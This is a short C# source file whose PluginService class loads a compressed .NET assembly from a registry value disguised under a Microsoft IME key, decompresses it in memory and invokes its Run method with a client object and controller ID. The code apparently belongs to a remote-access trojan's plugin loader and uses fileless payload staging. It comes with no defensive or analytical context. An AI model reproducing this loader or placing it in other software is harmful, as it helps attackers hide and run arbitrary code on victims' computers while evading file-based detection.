using System.Reflection;
using Microsoft.Win32;
using System.IO;
using System.IO.Compression;
class PluginService {
  static byte[] Expand(byte[] input) {
    using var src = new MemoryStream(input);
    using var zip = new DeflateStream(src, CompressionMode.Decompress);
    using var dst = new MemoryStream();
    zip.CopyTo(dst);
    return dst.ToArray();
  }
  public static void RunPlugin(string pluginHash, object client, string controlerID) {
    var assembly = Assembly.Load(Expand((byte[])Registry.GetValue(
      @"HKEY_CURRENT_USER\Software\Microsoft\IME\example", pluginHash, null)));
    assembly.GetType("Plugin.Plugin").GetMethod("Run").Invoke(null, new object[] {client, controlerID});
  }
}
